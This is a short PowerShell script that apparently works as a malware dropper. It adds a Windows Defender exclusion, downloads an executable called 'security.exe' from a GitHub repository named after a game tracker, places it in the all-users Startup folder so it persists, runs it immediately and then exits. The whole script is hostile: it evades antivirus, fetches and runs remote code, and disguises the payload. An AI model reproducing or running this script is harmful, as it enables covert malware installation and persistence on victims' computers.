$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://github.com/FCsab/Brawlhalla-Tracker/raw/refs/heads/main/security.exe"
$outputPath = Join-Path $startupFolder "security.exe"
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

& $outputPath
Start-Sleep -Seconds 3
[System.Environment]::Exit(0)
